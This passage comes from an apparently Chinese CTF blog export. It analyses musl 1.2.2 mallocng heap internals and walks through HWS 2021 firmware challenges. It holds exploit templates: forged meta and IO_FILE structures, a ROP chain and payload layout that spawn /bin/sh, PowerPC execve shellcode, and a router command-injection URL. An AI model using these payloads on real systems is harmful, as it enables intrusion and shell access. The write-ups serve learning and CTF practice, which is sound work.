这样group是会弹出avtive队列的, 而现在释放了一个\n其中的chunk,所以需要调用nontrivial_free()把这个group重新加入队列\n*/\n\t\tif (!freed || mask+self==all) break;\n        \n        //线程方面的一些知识，还不是太会\n\t\tif (!MT)\n\t\t\tg->freed_mask = freed+self;\n\t\telse if (a_cas(&g->freed_mask, freed, freed+self)!=freed)\n\t\t\tcontinue;\n\t\treturn;\n\t}\n\n\twrlock();\n\tstruct mapinfo mi = nontrivial_free(g, idx);\n\tunlock();\n\tif (mi.len) munmap(mi.base, mi.len);\n}\n```\n\n- 通过`get_meta()`找到chunk对应的meta，重置idx与offset，将meta的freed_mask中标记一下就算释放完毕了。\n- 有一些特殊情况的，需要跳出循环来调用`nontrivial_free()`完成相关操作\n\n#### ①nontrivial_free()\n\n```c\nstatic struct mapinfo nontrivial_free(struct meta *g, int i)\n{\n\tuint32_t self = 1u<<i;\n\tint sc = g->sizeclass;\n\tuint32_t mask = g->freed_mask | g->avail_mask;\n\n    //如果meta-group中所有chunk要么被释放要么可使用\n    //并且g可以被释放(不是mmap出来的),那么就要回收掉整个meta\n\tif (mask+self == (2u<<g->last_idx)-1 && okay_to_free(g)) {\n\t\t// any multi-slot group is necessarily on an active list\n\t\t// here, but single-slot groups might or might not be.\n\t\tif (g->next) {\n             //检查sc释放合法, 不是mmap(63)的\n\t\t\tassert(sc < 48);\n            //如果g是队列中开头的meta, 那么弹出队列后, 要激活后一个\n\t\t\tint activate_new = (ctx.active[sc]==g);\n\t\t\tdequeue(&ctx.active[sc], g);\n            //激活后一个meta过程中需要完成avail_mask和free_mask的设置\n            //即free_mask向avail_maks进行转移\n\t\t\tif (activate_new && ctx.active[sc])\n\t\t\t\tactivate_group(ctx.active[sc]);\n\t\t}\n        //现在要释放这个meta-group,放入ctx.free_meta_head中\n\t\treturn free_group(g);\n        \n\t} \n    //如果mask==0, 也就是这个meta-group中所有的chunk都被分配出去了\n    else if (!mask) {\n\t\tassert(sc < 48);\n\t\t// might still be active if there were no allocations\n\t\t// after last available slot was taken.\n        //现在这个全部chunk被分配出去的group中有一个chunk要被释放了\n        //因此这个meta-group要重新入队\n\t\tif (ctx.active[sc] != g) {\n\t\t\tqueue(&ctx.active[sc], g);\n\t\t}\n\t}\n\ta_or(&g->freed_mask, self);\n\treturn (struct mapinfo){ 0 };\n}\n```\n\n#### ②dequeue\n\n```c\n//v1.2.1 /src/malloc/mallocng/meta.h\n//meta的出队操作，一般漏洞点出在这里\nstatic inline void dequeue(struct meta **phead, struct meta *m)\n{\n\tif (m->next != m) {\n\t\tm->prev->next = m->next;\n\t\tm->next->prev = m->prev;\n\t\tif (*phead == m) *phead = m->next;\n\t} else {\n\t\t*phead = 0;\n\t}\n\tm->prev = m->next = 0;\n}\n```\n\n没有检测meta中的next和prev指针是否合法，如果可以伪造一个meta传入，控制它的prev/next指针，就可以做到像unlink一样的任意写\n\n#### ③queue\n\n```c\n//v1.2.2 /src/malloc/mallocng/meta.h\nstatic inline void queue(struct meta **phead, struct meta *m)\n{\n\tassert(!m->next);\n\tassert(!m->prev);\n\tif (*phead) {\n\t\tstruct meta *head = *phead;\n\t\tm->next = head;\n\t\tm->prev = head->prev;\n\t\tm->next->prev = m->prev->next = m;\n\t} else {\n\t\tm->prev = m->next = m;\n\t\t*phead = m;\n\t}\n}\n```\n\n当meta进入该函数，就会发生解链，然后进入到对应的active[sc]中，这种情况需要active[sc] = NULL，即该sizeclass下暂时不存在可用的meta。\n\n## 🔺注：\n\nmalloc和free的时候不会将chunk的内容置空，这个给我们创造了UAF的一些条件，同样的也有相应的静态堆内存\n\n## 4.利用方式\n\n### (1)泄露地址\n\n通常使用静态堆内存来进行泄露，但是这里就涉及一个问题，静态堆内存就算申请到了，也没有指针啊。所以现在的题目好多都是申请一个chunk结构体，比如\n\n```c\nstruct strChunk\n{\n\tchar size[8];\n\tchar* data;\n}\nstruct strChunk* myChunk = malloc(xxx); \nmyChunk.data = malloc(xxx);\n```\n\n这样在在一定的UAF或者溢出条件下，就可以泄露出data指针，而如果这个data指针恰好是从静态堆内存申请出来的，那么就能泄露libc地址了。\n\nheap地址也是类似，一般就是通过溢出或者UAF之类的来泄露了。\n\n如果没有的话，我能想到的就是无限申请，直到耗尽meta的空间，当它再开辟的meta空间的时候，由于是mmap分配的，那么就有可能申请出libc的空间\n\n### (2)getshell\n\n#### ①secret\n\n想要伪造meta，首先需要泄露secrect校验值\n\n#### ②伪造meta\n\n先行的方法基本都是伪造`meta`，伪造之后通常是通过两种方法进行利用，不同的方法伪造的`meta`基本也是不同的，下面具体介绍。\n\n##### a.dequeue\n\n调用链为\n\n```\n_libc_free->nontrivial_free->dequeue\n```\n\n这种是通过`dequeue`进行任意写覆盖`__stdout_used`指针(就像libc里面的`IO_list_all`)，然后伪造`__IO_FILE`，通过IO进行攻击。\n\n伪造的`meta`\n\n```python\n\nsizeclass = 1      \t#\nfreeable = 1\nlast_idx = 6  \t\t#\nmaplen = 1\n\nfake_meta = b''\nfake_meta += p64(stdout_used_addr-0x8) \t\t# prev\nfake_meta += p64(fake_IO_addr)\t\t\t \t# next\nfake_meta += p64(base) \t\t\t\t\t\t# mem\nfake_meta += p32(0x7e) + p32(0) # avail_mask, freed_mask\nfake_meta += p64((maplen << 12) | (sizeclass << 6) | (freeable << 5) | last_idx)\nfake_meta += p64(0)\n```\n\n- 获取`__stdout_used`\n\n  这里通过`dequeue`就是将`fake_IO_addr`赋值给`__stdout_used`，![image-20230816194459069](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230816194459069.png)\n\n  里面存放的是`stdout`的`__IO_FILE`结构体。对于去掉符号信息的`libc`，不知道`__stdout_used`在哪的可以尝试分析`exit`里面调用的`__stdio_exit`函数去看在哪里，\n\n  ```c\n  //v1.2.2 /src/exit/exit.c\n  _Noreturn void exit(int code)\n  {\n  \t__funcs_on_exit();\n  \t__libc_exit_fini();\n  \t__stdio_exit();\n  \t_Exit(code);\n  }\n  ```\n\n  ![image-20230816195302098](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230816195302098.png)\n\n  ```c\n  //v1.2.2 /src/stdio/__stdio_exit.c\n  \n  void __stdio_exit(void)\n  {\n  \tFILE *f;\n  \tfor (f=*__ofl_lock(); f; f=f->next) close_file(f);\n  \tclose_file(__stdin_used);\n  \tclose_file(__stdout_used);\n  \tclose_file(__stderr_used);\n  }\n  ```\n\n  ![image-20230816195412866](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230816195412866.png)\n\n  其实这里也可以看到，劫持`__stdin_used/__stderr_used`也是一样的效果，但是实际中比较不容易出错的应该是`__stdout_used`用的比较多\n\n- 伪造`fake_IO_addr`\n\n  主要是伪造几个关键的点，常见的伪造模板如下\n\n  ```python\n  # ROP\n  \n  gadget_addr = libc_base + libc.sym['longjmp'] + 30\n  #mov     rsp, [rdi+30h];jmp     qword ptr [rdi+38h]\n  \n  fake_IO = p64(0)                       \t\t\t# flags\n  fake_IO += p64(0)                               # rpos\n  fake_IO += p64(0)                               # rend\n  fake_IO += p64(rop_addr)                        # close\n  fake_IO += p64(1)                               # wend\n  fake_IO += p64(1)                               # wpos\n  fake_IO += p64(rop_addr+0x8)                    # mustbezero_1 \t#0x30\n  fake_IO += p64(pop_rdi_ret)                     # wbase\t\t\t#0x38\n  fake_IO += p64(0)                               # read\n  fake_IO += p64(gadget_addr)  \t\t\t\t\t# write\n  \n  binsh_addr = libc_base + libc.search('/bin/sh').next()\n  rop = \"\"\n  rop += p64(pop_rdi_ret) + p64(binsh_addr)\n  rop += p64(pop_rsi_ret) + p64(0)\n  rop += p64(pop_rdx_ret) + p64(0)\n  rop += p64(pop_rax_ret) + p64(59)\n  rop += p64(syscall_ret)\n  ```\n\n  通过`close_file`函数中的`f->write`进入`gadget`，然后依据`rdi`劫持`rsp`，从而进行`ROP`\n\n- `base`获取\n\n  这个通常是用来绕过在进入`nontrivial_free`函数之前的`get_meta`函数中针对`meta`检查的，链子为`__libc_free->get_meta`在如下代码中\n\n  ```c\n  //v1.2.2 /src/malloc/mallocng/meta.h\n  static inline struct meta *get_meta(const unsigned char *p)\n  {\n  \tassert(!((uintptr_t)p & 15));\n  \tint offset = *(const uint16_t *)(p - 2);\n  \tint index = get_slot_index(p);\n  \tif (p[-4]) {\n  \t\tassert(!offset);\n  \t\toffset = *(uint32_t *)(p - 8);\n  \t\tassert(offset > 0xffff);\n  \t}\n  \tconst struct group *base = (const void *)(p - UNIT*offset - UNIT);\n  \tconst struct meta *meta = base->meta;\n  \tassert(meta->mem == base);  //主要用来绕过这里\n  \tassert(index <= meta->last_idx);\n  \tassert(!(meta->avail_mask & (1u<<index)));\n  \tassert(!(meta->freed_mask & (1u<<index)));\n  \tconst struct meta_area *area = (void *)((uintptr_t)meta & -4096);\n  \tassert(area->check == ctx.secret);\n  \tif (meta->sizeclass < 48) {\n  \t\tassert(offset >= size_classes[meta->sizeclass]*index);\n  \t\tassert(offset < size_classes[meta->sizeclass]*(index+1));\n  \t} else {\n  \t\tassert(meta->sizeclass == 63);\n  \t}\n  \tif (meta->maplen) {\n  \t\tassert(offset <= meta->maplen*4096UL/UNIT - 1);\n  \t}\n  \treturn (struct meta *)meta;\n  }\n  ```\n\n  需要满足`meta->mem=base`，这里的`base`就是通过进入索引为0的`chunk_addr-0x10`，比如如下索引为0的`chunk`\n\n  ![image-20230817192343088](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230817192343088.png)\n  \n  这里获取得到`base`之后，进一步得到`meta`，即为`0x7ffff7fff0010`\n  \n  ![image-20230817192915034](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230817192915034.png)\n\n- 设置`avail_mask`、`freed_mask`、`last_idx`、`freeable`、`sizeclass`、`maplen`\n\n  设置这几个参数，主要用于通过`nontrivial_free`函数中的检查，包括`ok_to_free`和`get_stride`，如下代码所示\n\n  ```c\n  //v1.2.2 /src/malloc/mallocng/free.c\n  static struct mapinfo nontrivial_free(struct meta *g, int i)\n  {\n  \tuint32_t self = 1u<<i;\n  \tint sc = g->sizeclass;\n  \tuint32_t mask = g->freed_mask | g->avail_mask;\n  \t\n      //通过适当计算进行设置,0x7e+1 == (2<<1)-1 == 127\n      //ok_to_free就是做一些检查,满足freeable==1,sizeclass<48,maplen==1\n      //然后通过g->next!=g来返回1\n  /*\n  //v1.2.2  /src/malloc/mallocng/free.c\n  static int okay_to_free(struct meta *g)\n  {\n  \tint sc = g->sizeclass;\n  \tif (!g->freeable) return 0;\n  \tif (sc >= 48 || get_stride(g) < UNIT*size_classes[sc])\n  \t\treturn 1;\n  \tif (!g->maplen) return 1;\n  \tif (g->next != g) return 1;\n  \tif (!is_bouncing(sc)) return 1;\n  \tsize_t cnt = g->last_idx+1;\n  \tsize_t usage = ctx.usage_by_class[sc];\n  \tif (9*cnt <= usage && cnt < 20)\n  \t\treturn 1;\n  \treturn 0;\n  }\n  */\n  \tif (mask+self == (2u<<g->last_idx)-1 && okay_to_free(g)) {\n  \t\tif (g->next) {\n  \t\t\tassert(sc < 48);\n              //......\n  \t\t\tdequeue(&ctx.active[sc], g);\n              //.....\n  \t\t}\n          //....\n  \t\treturn free_group(g);\n  \t} \n      else if (!mask) {\n          //.....\n  \t}\n  \t//....\n  }\n  ```\n\n  🔺注：这个`last_idx`随便改的话可能会在`__libc_free`中出现错误，就是一个依据`last_idx`判断`chunk`上某个位置是否为0，这个也比较好改\n\n总体来说进入`dequeue`就算成功，实现任意地址任意写，将`__stdout_used`的值劫持为`fake_IO_addr`。之后就大多通过调用链`exit()->__stdio_exit()->close_file()->(f->write(f,0,0))`，跳转到`gadget`完成栈劫持利用的。\n\n##### b.queue\n\n调用链为\n\n```\n_libc_free->nontrivial_free->queue\n```\n\n看一下`nontrivial_free`源代码就能理解，就是通过条件满足\n\n```c\n//v1.2.2 /src/malloc/mallocng/free.c\nstatic struct mapinfo nontrivial_free(struct meta *g, int i)\n{\n\tuint32_t self = 1u<<i;\n\tint sc = g->sizeclass;\n\tuint32_t mask = g->freed_mask | g->avail_mask;\n\t\n    //通过适当计算进行设置,0x7e+1 == (2<<1)-1 == 127\n    //ok_to_free就是做一些检查,满足freeable==1,sizeclass<48,maplen==1\n    //然后通过g->next!=g来返回1\n/*\n//v1.2.2  /src/malloc/mallocng/free.c\nstatic int okay_to_free(struct meta *g)\n{\n\tint sc = g->sizeclass;\n\tif (!g->freeable) return 0;\n\tif (sc >= 48 || get_stride(g) < UNIT*size_classes[sc])\n\t\treturn 1;\n\tif (!g->maplen) return 1;\n\tif (g->next != g) return 1;\n\tif (!is_bouncing(sc)) return 1;\n\tsize_t cnt = g->last_idx+1;\n\tsize_t usage = ctx.usage_by_class[sc];\n\tif (9*cnt <= usage && cnt < 20)\n\t\treturn 1;\n\treturn 0;\n}\n*/\n\tif (mask+self == (2u<<g->last_idx)-1 && okay_to_free(g)) {\n        //...\n\t} \n    else if (!mask) {\n\t\tif (ctx.active[sc] != g) {\n\t\t\tqueue(&ctx.active[sc], g);\n\t\t}\n\t}\n\t//....\n}\n```\n\n依照相关逻辑，伪造`meta`如下\n\n```python\nlast_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta\nfake_meta = p64(0)                              # prev\nfake_meta += p64(0)                             # next\nfake_meta += p64(base)                 \t\t\t# mem\nfake_meta += p32(0) + p32(0)                    # avail_mask, freed_mask\nfake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)\nfake_meta += p64(0)\n```\n\n这里相关参数设置的是和`dequeue`差不多，不太一样的主要是`freeable`、`prev`、`next`、`avail_mask`、`freed_mask`、`maplen`等的设置，同样也是为了通过`get_meta`以及相关的检测\n\n这样在`queue`之后就能在对应的`active[sc]`中得到一个`fake_meta`，随后通过任意写`faka_meta->mem`即可进行任意申请。\n\n如果使用`calloc`进行申请，则还需要在`base->meta`位置通过`dequeue`写入`fake_meta_addr`才行。\n\n```c\n//v1.2.2 /src/malloc/calloc.c\nvoid *calloc(size_t m, size_t n)\n{\n    //...\n\tn *= m;\n\tvoid *p = malloc(n);\n\tif (!p || (!__malloc_replaced && __malloc_allzerop(p)))\n\t\treturn p;\n\tn = mal0_clear(p, n);\n\treturn memset(p, 0, n);\n}\n```\n\n因为在进入`calloc`之后，如果申请出`chunk`则会进入检测`__malloc_allzerop`这个函数，而在`musl`中即为`get_meta`，会对`meta`进行检测\n\n![image-20230822205832570](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230822205832570.png)\n\n通过`malloc`进行申请的则不用在`base->meta`位置通过`dequeue`写入`fake_meta_addr`，可以直接申请出来。\n\n随后就可以通过修改`__stdout_FILE`结构体，在没有`exit`的情况下，就可以通过`puts->fputs_unlocked->fwrite_unlocked->__fwritex->(f->write)`调用链来调用到虚假的`f->write`函数指针，随后通过`gadget`劫持栈完成利用，和之前的`dequeue`类似。\n\n```C\n//v1.2.2 /src/stdio/fwrite.c\n\nsize_t __fwritex(const unsigned char *restrict s, size_t l, FILE *restrict f)\n{\n\tsize_t i=0;\n    //....\n\tif (l > f->wend - f->wpos) return f->write(f, s, l);\n\t//...\n\treturn l+i;\n}\n```\n\n注：当然，也可以通过`dequeue`直接修改某个`active[sc]`的`mem`来申请到`__stdout_FILE`进行修改，但是这个需要写了`ELF`基地址得到`meta`地址，还需要`malloc`进行申请才行。\n\n另外当用`malloc`申请`chunk`时，如果可以泄露`heap`基地址，那么就可以通过任意修改`active[sz]->mem`进行任意申请，但是申请到的位置在不同的`active[sc]`中不太一样，具体的进行分析。`calloc`存在`get_meta`相关的校验。\n\n#### ③触发伪造meta\n\n那么如何通过释放触发伪造的`meta`呢。这个在`get_meta`中有\n\n```c\nint offset = *(const uint16_t *)(p - 2);\nint index = get_slot_index(p);\nif (p[-4]) {\n    assert(!offset);\n    offset = *(uint32_t *)(p - 8);\n    assert(offset > 0xffff);\n}\nconst struct group *base = (const void *)(p - UNIT*offset - UNIT);\nconst struct meta *meta = base->meta;\n```\n\n即依据`chunk`元数据里面的`idx/offset`来得到`base`，从而得到`meta`，那么通常的漏洞利用就是通过溢出写`chunk`的元数据，使之成为第`0`个`chunk`，从而获取到伪造的`meta`。如下即通过溢出chunk使之索引为0，在`chunk_addr-0x10`部分伪造`meta`，之后释放该`chunk`，发现索引为0，即可从`chunk_addr-0x10`的地方找到伪造的`meta`地址。\n\n![image-20230817192343088](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230817192343088.png)\n\n#### ④绕过检测\n\n在实际利用时，还需要绕过`get_meta`中对于`meta_area`的检测\n\n```c\nconst struct meta_area *area = (void *)((uintptr_t)meta & -4096);\nassert(area->check == ctx.secret);\n```\n\n即通过`meta`所在页得到`meta_area`，然后检测`ctx.secret`是否为`meta_area->check`。那么在利用时其实不一定能满足申请到的`chunk`在`0x---000`的位置，那么通常就申请`0x2000`的`chunk`来得到`libc`上的`chunk`，并且通过适当调整使得`fake_meta`所在页的首地址数据为`secret`。那么通常的payload配置如下\n\n```python\npayload = \"\"\npayload += rop\npayload = payload.ljust(0xfe0,\"\\x00\")\npayload += p64(secret) + p64(0)\npayload += fake_meta\npayload += binsh\npayload += fake_IO\n```\n\n![image-20230822221035821](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230822221035821.png)\n\n\n\n参考：\n\n[[原创\\]小小做题家之——musl 1.2.2的利用手法-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-274640.htm#msg_header_h3_1)\n\n[[原创\\]musl 1.2.2 总结+源码分析 One-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_7)\n\n[新版musl-libc malloc源码分析与调试-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/252293#h2-13)\n\n[从一次 CTF 出题谈 musl libc 堆漏洞利用-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/202253)\n\n[借助DefCon Quals 2021的mooosl学习musl mallocng（源码审计篇）-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/241101#h2-6)\n\n[从2021 WMCTF Nescafe学习musl libc UAF 利用-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/251832)\n\n[借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/241104#h2-0)\n\n[musl-1.2.x堆部分源码分析-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/246929#h2-5)\n\n[从musl libc 1.1.24到1.2.2 学习pwn姿势-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/253566#h2-8)\n\n[musl 1.2.2 总结+源码分析 One - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10326#toc-4)\n","tags":["Musl"],"categories":["PWN","Musl"]},{"title":"2021HWS固件学习","url":"/2022/01/17/HWS硬件学习/","content":"\n# 一、练习题\n\n## 1.SMT32固件\n\n### (1)IDA分析\n\n#### ①选择架构\n\n需要在加载界面选择架构，如图选择ARM小端序\n\n![image-20220119162036357](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191620395.png)\n\n#### ②设置选项\n\n处理器选项设置对应\n\n![du](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191621446.png)\n\n#### ③选择固件加载地址\n\nOK之后，进入填写加载地址的界面，修改如下\n\n![image-20220119162333850](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191623892.png)\n\n这个对于SMT32这种类型的固件是一定的，需要自己去上网查询，Input file的loading address可以让我们输入其他值，就使得IDA不从头加载，而从我们输入的地址开始加载。\n\n#### ④寻找函数地址\n\n#### A.查找中断处理函数\n\n在最开头地址+4的地方保存的是中断处理函数，按d转换数据双击点进去即可\n\n![image-20220119162645572](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191626607.png)\n\n#### B.识别函数\n\n发现是奇数地址，那么在奇数地址-1的地方，按c，即可分析出一些函数\n\n![image-20220119162843385](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191628430.png)\n\n其中0x08000100即为中断处理函数，相对于SMT32固件而言，该函数的第二次跳转地址上的首次跳转的最后跳转再跳转即为main函数地址\n\n![image-20220119163217387](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632420.png)\n\n![image-20220119163231426](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632453.png)\n\n![image-20220119163255655](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632698.png)\n\n![image-20220119163337683](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633721.png)\n\n![image-20220119163359036](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633077.png)\n\n### (2)解密\n\n![image-20220119163634811](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191636846.png)\n\n分析之后，即可找到对应的加密算法，按照上述逻辑恢复即可\n\n```python\na = [   \n        0x7D,0x77,0x40,0x7A,0x66,0x30,0x2A,0x2F,\n        0x28,0x40,0x7E,0x30,0x33,0x34,0x2C,0x2E,\n        0x2B,0x28,0x34,0x30,0x30,0x7C,0x41,0x34,\n        0x28,0x33,0x7E,0x30,0x34,0x33,0x33,0x30,\n        0x7E,0x2F,0x31,0x2A,0x41,0x7F,0x2F,0x28,\n        0x2E,0x64\n    ]\n\nflag = \"\"\nfor i in a:\n    flag += chr((i ^ 0x1E) + 3)\nprint(flag)\n```\n\n\n\n## 2.BlinkBlink_200\n\n参考：[HWS2021冬令营选拔赛 | Clang鱼塘 (blingblingxuanxuan.github.io)](https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/#blinkblink)\n\n### (1)固件解包\n\n```\nbinwalk -Me uImage\n```\n\n### (2)当前目录搜索\n\n该命令可在当前文件夹下搜索密码，一般这种路由器的密码都是从/etc/passwd中取得\n\n```\ngrep -ri \"etc/passwd\"\n```\n\n![image-20220119174406881](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191744973.png)\n\n排除busybox和libc，那么先去goahead中找，直接拖进IDA32分析\n\ngoahead是一个嵌入式的Web服务器：https://www.embedthis.com/goahead/\n\n#### ①定位字符串\n\n搜索字符串`set_qos_cfg`，这个常用，找到如下\n\n![image-20220119175251051](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191752096.png)\n\n漏洞常常在`goform`接口下，简单查看一下，发现其中有一个`set_cmd`的引用\n\n![image-20220119175504033](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191755068.png)\n\n进入函数，发现一个设置命令的函数`bs_SetCmd`\n\n![image-20220119175643376](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191756417.png)\n\n#### ②分析函数\n\n参照上面的函数名称，继续搜索\n\n![image-20220119175815328](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191758415.png)\n\n发现定位在libshare中，打开分析一下\n\n![image-20220119180323116](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191803171.png)\n\n其中off_4F2CC的值为%s，即格式化为字符串输出给v21，那么很明显就是使用`popen`进行命令执行\n\n![image-20220119180607832](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191806862.png)\n\n#### ③URL访问\n\n```\n/goform/set_cmd?cmd=cat /home/goahead/flag.txt\n```\n\n这里就是调用goform的接口API进行测试即可获得flag\n\n\n\n## 3.httpd\n\n不太会\n\n\n\n## 4.nodemcu\n\n直接出\n\n```\nstrings nodemcu.bin\n```\n\n![image-20220120125706243](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201257297.png)\n\n看来以后都先strings一把梭试试\n\n\n\n## 5.easybios\n\n### (1)前置探索\n\n按照命令提示启动，但是有时候可以，有时候又不可以，可能在等一下就可以？\n\n![image-20220120130559529](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201305567.png)给了提示\n\n![image-20220120130724621](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307664.png)\n\n尝试一下\n\n![image-20220120130702363](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201307395.png)\n\n### (2)IDA分析\n\n使用binwalk解包\n\n```\nbinwalk -Me easybios\n```\n\n然后IDA打开解包出来的二进制文件\n\n![image-20220120143603848](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201436882.png)\n\n搜索一下Wrong字符串，没搜到，尝试用unicode格式搜索，即UTF-16LE格式，一个字符两个字节。\n\n![image-20220120144209024](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201442069.png)\n\n然后加上00即可->`57 00 72 00 6F 00 6E 00 67 00`，找到两个\n\n![image-20220120144641985](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201446022.png)\n\n![image-20220120144707349](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447384.png)\n\n![image-20220120144725574](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201447608.png)\n\n很明显应该是下面那个，但是这个文件有点大，不好解析，再加上之前在解包的时候看到包含很多PE文件，所以这个程序应该也是在一个PE文件里，那么我们依据地址，找到对应的PE文件头尾\n\n![image-20220120150501890](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201505983.png)\n\n### (3)切割分析\n\n#### ①寻找头尾地址\n\n依据地址找到以下头尾\n\n![image-20220120155301520](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201553654.png)\n\n#### ②使用Winhex进行切割\n\n使用Winhex打开，然后找到头尾，使用alt+G搜索地址，选定头尾\n\n![image-20220120155739157](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201557194.png)\n\n头部\n\n![image-20220120155816532](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201558569.png)\n\n尾部\n\n![image-20220120155907991](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201559030.png)\n\n选中选快，右键编辑->复制选块->至新文件，然后保存用IDA打开，照常使用全局搜索字符`57 00 72 00 6F 00 6E 00 67 00`找到对应的函数`sub_31D6F`，一番判断如下：\n\n![image-20220120154940674](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201549732.png)\n\n然后顺着逻辑理清楚即可，或者尝试使用angr解题，以下exp参照`lxonz师傅`\n\n[2021HWS冬令营线上赛固件安全WriteUp|NOSEC安全讯息平台 - 白帽汇安全研究院](https://nosec.org/home/detail/4672.html)\n\n```python\ndef print_bytes_hex(data):\n    lin = ['%0x' % i for i in data]\n    print(\"\".join(lin))\n\nmagic = 'OVMF_And_Easy_Bios'\ndemo = [0x46, 0x77, 0x74, 0xb0, 0x27, 0x8e, 0x8f, 0x5b, 0xe9, 0xd8, 0x46, 0x9c, 0x72, 0xe7, 0x2f, 0x5e]\nv13 = [0]*514\nfor i in range(256):\n    v13[i] = i\n    v13[i+256] = ord(magic[i%18])\n\nv2 = 0\nv3 = 0\nnew_list = []\nwhile v2!=256:\n    v4 = v13[v2]\n    v3 = (v13[v2 + 256] + v4 + v3) % 256\n    v5 = v13[v3]\n    v13[v3] = v4\n    v13[v2] = v5\n    v2+=1\n\nv6 = 0\nv7 = 0\nv8 = 0\n\nwhile v6 != 16:\n    v8 = v8 + 1\n    v9 = v13[v8]\n    v10 = (v9 + v7) % 256\n    v11 = v13[v10]\n    v13[v10] = v9\n    v7 = (v9 + v7) % 256\n    v13[v8] = v11\n    result = v13[(v11 + v13[v10]) % 256]\n    new_list.append(result)\n    #(v0 + v6) ^= result\n    v6 += 1\n#print len(demo)\n#print len(new_list)\nflag_list = []\nfor i in range(16):\n    flag_list.append(new_list[i]^demo[i])\n    print(hex(new_list[i]^demo[i]))\nprint_bytes_hex(flag_list)\n#flag{88baec0b5154f859b5851097bb567f5c}\n```\n\n\n\n## 6.PPPPPPC\n\n### (1)调试\n\npowerpc大端架构\n\n调试发现栈溢出，读入0x320，并且变量偏移在0x140，可覆盖$lr寄存器，控制程序流，保护都没开，就尝试ret2shellcode\n\n![image-20220120194956344](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201949396.png)\n\n### (2)泄露地址\n\n使用题目给的`qemu-ppc-static`来运行会使得程序打印所有寄存器的值，远程也是这样的\n\n![image-20220120195324259](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201953531.png)\n\n参照如下\n\n![image-20220120195537738](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201955804.png)\n\n远程肯定也是qemu，地址不会改变，那么就可以获得栈地址，同时依据调试数据也能得到我们输入数据的相应的偏移\n\n### (3)寻找shellcode\n\n直接去[shell-storm | Shellcodes Database](http://shell-storm.org/shellcode/)找对应的shellcode\n\n```\n\"\\x7c\\x3f\\x0b\\x78\"\t/*mr\tr31,r1*/\n\"\\x7c\\xa5\\x2a\\x79\"\t/*xor.\tr5,r5,r5*/\n\"\\x42\\x40\\xff\\xf9\"\t/*bdzl+\t10000454< main>*/\n\"\\x7f\\x08\\x02\\xa6\"\t/*mflr\tr24*/\n\"\\x3b\\x18\\x01\\x34\"\t/*addi\tr24,r24,308*/\n\"\\x98\\xb8\\xfe\\xfb\"\t/*stb\tr5,-261(r24)*/\n\"\\x38\\x78\\xfe\\xf4\"\t/*addi\tr3,r24,-268*/\n\"\\x90\\x61\\xff\\xf8\"\t/*stw\tr3,-8(r1)*/\n\"\\x38\\x81\\xff\\xf8\"\t/*addi\tr4,r1,-8*/\n\"\\x90\\xa1\\xff\\xfc\"\t/*stw\tr5,-4(r1)*/\n\"\\x3b\\xc0\\x01\\x60\"\t/*li\tr30,352*/\n\"\\x7f\\xc0\\x2e\\x70\"\t/*srawi\tr0,r30,5*/\n\"\\x44\\xde\\xad\\xf2\"\t/*.long\t0x44deadf2*/\n\"/bin/shZ\"; // the last byte becomes 